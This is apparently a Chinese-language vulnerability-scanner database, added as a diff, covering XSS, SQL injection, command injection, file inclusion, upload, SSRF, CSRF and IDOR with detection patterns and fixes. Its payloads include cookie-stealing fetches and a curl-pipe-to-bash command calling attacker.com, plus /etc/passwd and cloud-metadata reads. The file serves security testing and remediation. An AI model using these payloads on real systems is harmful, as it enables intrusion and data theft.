@@ -1,0 +1,294 @@
+{
+    "XSS-001": {
+        "id": "XSS-001",
+        "name": "反射型XSS漏洞",
+        "description": "网站未对用户输入进行适当过滤，导致可以注入恶意JavaScript代码",
+        "severity": "high",
+        "type": "xss",
+        "subtype": "reflected",
+        "cve": null,
+        "payloads": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "\"><script>alert(1)</script>"
+        ],
+        "patterns": [
+            "script.*?alert",
+            "onerror.*?alert"
+        ],
+        "remediation": "对所有用户输入进行HTML编码，使用现代框架的XSS防护机制，实施内容安全策略(CSP)",
+        "references": [
+            "https://owasp.org/www-community/attacks/xss/",
+            "https://portswigger.net/web-security/cross-site-scripting"
+        ]
+    },
+    "XSS-002": {
+        "id": "XSS-002",
+        "name": "存储型XSS漏洞",
+        "description": "应用程序将未经过滤的用户输入存储在数据库中，并在其他页面显示",
+        "severity": "critical",
+        "type": "xss",
+        "subtype": "stored",
+        "cve": null,
+        "payloads": [
+            "<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>",
+            "<svg onload=alert(document.domain)>",
+            "<img src=x onerror=fetch('/api/admin_data').then(r=>r.text()).then(t=>fetch('http://attacker.com/?d='+btoa(t)))>"
+        ],
+        "patterns": [
+            "script.*?fetch",
+            "onload.*?alert",
+            "onerror.*?fetch"
+        ],
+        "remediation": "实施严格的输入验证，使用HTML编码，实施CSP策略，定期清理存储的数据",
+        "references": [
+            "https://owasp.org/www-community/attacks/xss/",
+            "https://portswigger.net/web-security/cross-site-scripting/stored"
+        ]
+    },
+    "SQLI-001": {
+        "id": "SQLI-001",
+        "name": "SQL注入漏洞",
+        "description": "应用程序未对SQL查询参数进行适当的转义和参数化",
+        "severity": "critical",
+        "type": "sql_injection",
+        "subtype": "error_based",
+        "cve": null,
+        "payloads": [
+            "' OR '1'='1",
+            "' UNION SELECT NULL,NULL--",
+            "' AND 1=CONVERT(int,(SELECT @@VERSION))--"
+        ],
+        "patterns": [
+            "SQL syntax.*MySQL",
+            "Warning.*mssql_query",
+            "ORA-[0-9][0-9][0-9][0-9]"
+        ],
+        "remediation": "使用参数化查询或预处理语句，避免直接拼接SQL语句，限制数据库用户权限",
+        "references": [
+            "https://owasp.org/www-community/attacks/SQL_Injection",
+            "https://portswigger.net/web-security/sql-injection"
+        ]
+    },
+    "SQLI-002": {
+        "id": "SQLI-002",
+        "name": "时间盲注SQL注入",
+        "description": "通过SQL查询执行时间差异来推断数据内容的注入方式",
+        "severity": "high",
+        "type": "sql_injection",
+        "subtype": "time_based",
+        "cve": null,
+        "payloads": [
+            "' AND IF(1=1,SLEEP(5),0)--",
+            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+            "'; WAITFOR DELAY '0:0:5'--"
+        ],
+        "patterns": [
+            "SLEEP\\([0-9]+\\)",
+            "pg_sleep",
+            "WAITFOR DELAY"
+        ],
+        "remediation": "使用参数化查询，实施请求超时机制，监控异常的查询执行时间",
+        "references": [
+            "https://owasp.org/www-community/attacks/SQL_Injection_Blind",
+            "https://portswigger.net/web-security/sql-injection/blind/time-delays"
+        ]
+    },
+    "RCE-001": {
+        "id": "RCE-001",
+        "name": "命令注入漏洞",
+        "description": "应用程序在执行系统命令时未对用户输入进行适当过滤",
+        "severity": "critical",
+        "type": "command_injection",
+        "subtype": "os_command",
+        "cve": null,
+        "payloads": [
+            "; cat /etc/passwd",
+            "| whoami",
+            "`id`",
+            "$(curl http://attacker.com/shell.txt | bash)"
+        ],
+        "patterns": [
+            ";.*?(cat|ls|pwd)",
+            "\\|.*?(whoami|id)",
+            "`.*?`",
+            "\\$\\(.*?\\)"
+        ],
+        "remediation": "避免使用系统命令，使用API替代，如果必须使用则建立白名单和严格的输入验证",
+        "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection",
+            "https://portswigger.net/web-security/os-command-injection"
+        ]
+    },
+    "FILE-001": {
+        "id": "FILE-001",
+        "name": "本地文件包含漏洞",
+        "description": "应用程序允许包含本地文件，可能导致敏感信息泄露或代码执行",
+        "severity": "critical",
+        "type": "file_inclusion",
+        "subtype": "lfi",
+        "cve": null,
+        "payloads": [
+            "../../../etc/passwd",
+            "..%2f..%2f..%2fetc%2fpasswd",
+            "/var/log/apache2/access.log",
+            "php://filter/convert.base64-encode/resource=index.php"
+        ],
+        "patterns": [
+            "\\.\\./",
+            "php://filter",
+            "file://"
+        ],
+        "remediation": "使用白名单验证文件路径，禁用危险的PHP配置项如allow_url_include",
+        "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
+            "https://portswigger.net/web-security/file-path-traversal"
+        ]
+    },
+    "FILE-002": {
+        "id": "FILE-002",
+        "name": "远程文件包含漏洞",
+        "description": "应用程序允许包含远程文件，可能导致远程代码执行",
+        "severity": "critical",
+        "type": "file_inclusion",
+        "subtype": "rfi",
+        "cve": null,
+        "payloads": [
+            "http://attacker.com/shell.php",
+            "https://pastebin.com/raw/malicious_code",
+            "ftp://attacker.com/payload.php"
+        ],
+        "patterns": [
+            "http://.*?\\.php",
+            "https://.*?\\.php",
+            "ftp://.*?\\.php"
+        ],
+        "remediation": "禁用远程文件包含功能，使用白名单验证文件路径，禁用危险的PHP配置项",
+        "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion",
+            "https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/"
+        ]
+    },
+    "UPLOAD-001": {
+        "id": "UPLOAD-001",
+        "name": "不安全的文件上传",
+        "description": "应用程序未正确验证上传文件的类型和内容，可能导致代码执行",
+        "severity": "critical",
+        "type": "file_upload",
+        "subtype": "unrestricted",
+        "cve": null,
+        "payloads": [
+            "shell.php",
+            "shell.php.jpg",
+            "shell.php%00.jpg",
+            ".htaccess"
+        ],
+        "patterns": [
+            "\\.php$",
+            "\\.php\\.[a-zA-Z]+$",
+            "\\.php%00",
+            "\\.htaccess"
+        ],
+        "remediation": "实施严格的文件类型验证，使用白名单方式验证文件扩展名，检查文件内容的魔术数字",
+        "references": [
+            "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
+            "https://portswigger.net/web-security/file-upload"
+        ]
+    },
+    "SSRF-001": {
+        "id": "SSRF-001",
+        "name": "服务器端请求伪造",
+        "description": "应用程序代表攻击者发起请求，可能导致内网探测或远程服务攻击",
+        "severity": "high",
+        "type": "ssrf",
+        "subtype": "basic",
+        "cve": null,
+        "payloads": [
+            "http://localhost/admin",
+            "http://169.254.169.254/latest/meta-data/",
+            "http://internal-service/api",
+            "file:///etc/passwd"
+        ],
+        "patterns": [
+            "localhost",
+            "127\\.0\\.0\\.1",
+            "169\\.254\\.169\\.254",
+            "file:///"
+        ],
+        "remediation": "建立URL白名单，禁止访问内网地址，禁用不必要的协议支持",
+        "references": [
+            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
+            "https://portswigger.net/web-security/ssrf"
+        ]
+    },
+    "CSRF-001": {
+        "id": "CSRF-001",
+        "name": "跨站请求伪造",
+        "description": "应用程序未正确验证请求来源，导致攻击者可以代表用户执行操作",
+        "severity": "high",
+        "type": "csrf",
+        "subtype": null,
+        "cve": null,
+        "payloads": [
+            "<img src='http://bank.com/transfer?to=attacker&amount=1000'>",
+            "<form action='http://bank.com/transfer' method='POST' id='f'><input type='hidden' name='to' value='attacker'></form><script>f.submit()</script>"
+        ],
+        "patterns": [
+            "<img.*?src=.*?bank\\.com",
+            "<form.*?action=.*?bank\\.com"
+        ],
+        "remediation": "实施CSRF令牌，验证Referer头，使用SameSite Cookie属性",
+        "references": [
+            "https://owasp.org/www-community/attacks/csrf",
+            "https://portswigger.net/web-security/csrf"
+        ]
+    },
+    "IDOR-001": {
+        "id": "IDOR-001",
+        "name": "不安全的直接对象引用",
+        "description": "应用程序未正确验证用户对资源的访问权限",
+        "severity": "high",
+        "type": "idor",
+        "subtype": null,
+        "cve": null,
+        "payloads": [
+            "/api/user/2/profile",
+            "/download?file=../../../etc/passwd",
+            "/admin/users?id=1"
+        ],
+        "patterns": [
+            "/api/user/[0-9]+",
+            "/download\\?file=",
+            "/admin/.*?\\?id="
+        ],
+        "remediation": "实施严格的访问控制，使用间接引用方式，验证用户权限",
+        "references": [
+            "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html",
+            "https://portswigger.net/web-security/access-control/idor"
+        ]
+    },
+    "XSS-LEVEL1": {
+        "id": "XSS-LEVEL1",
+        "name": "XSS靶场第一关",
+        "description": "XSS Challenge Tour Level 1 - 基础XSS注入测试，目标URL: https://xss-challenge-tour.bachang.org/level1.php?name=test",
+        "severity": "medium",
+        "type": "xss",
+        "subtype": "reflected",
+        "cve": null,
+        "payloads": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg onload=alert(1)>",
+            "javascript:alert(1)"
+        ],
+        "patterns": [
+            "script.*?alert",
+            "onerror.*?alert",
+            "onload.*?alert"
+        ],
+        "remediation": "对用户输入进行HTML编码，使用现代框架的XSS防护机制",
+        "references": [
+            "https://xss-challenge-tour.bachang.org/level1.php"
+        ]
+    }
+} 
